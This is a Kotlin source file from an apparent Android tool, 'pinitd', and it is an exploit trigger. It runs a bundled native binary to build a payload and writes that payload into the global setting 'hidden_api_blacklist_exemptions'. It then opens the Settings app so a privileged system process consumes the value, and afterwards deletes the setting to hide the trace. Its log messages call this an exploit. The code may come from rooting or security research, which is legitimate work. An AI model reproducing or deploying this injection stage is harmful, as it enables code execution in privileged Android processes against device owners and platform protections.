package im.agg.pinitd

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader

const val TAG = "pinitd-trampoline"
val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")

fun launch(context: Context) {
    // Path will end with "base.apk". Remove that and navigate to native library
    val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
    val binaryPath = basePath + "lib/arm64/libpinitd.so"
    Log.w(TAG, "Attempting to launch: $binaryPath")
    try {
        val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))

        val reader = BufferedReader(InputStreamReader(process.inputStream))
        var payload = reader.readText()
        reader.close()

        Log.w(TAG, "Setting payload: $payload")
        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)

        Log.w(TAG, "Payload set")
        startSettings(context)

        context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)

        Log.w(TAG, "Trampoline complete")
    } catch (e: Exception) {
        Log.e(TAG, "Exploit error: ${e.message}")
    }
}

fun startSettings(context: Context) {
    try {
        val intent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
        if (intent != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } else {
            Log.e(TAG, "Settings app not found")
        }
    } catch (e: Exception) {
        Log.e(TAG, "Settings launch error: ${e.message}")
    }
}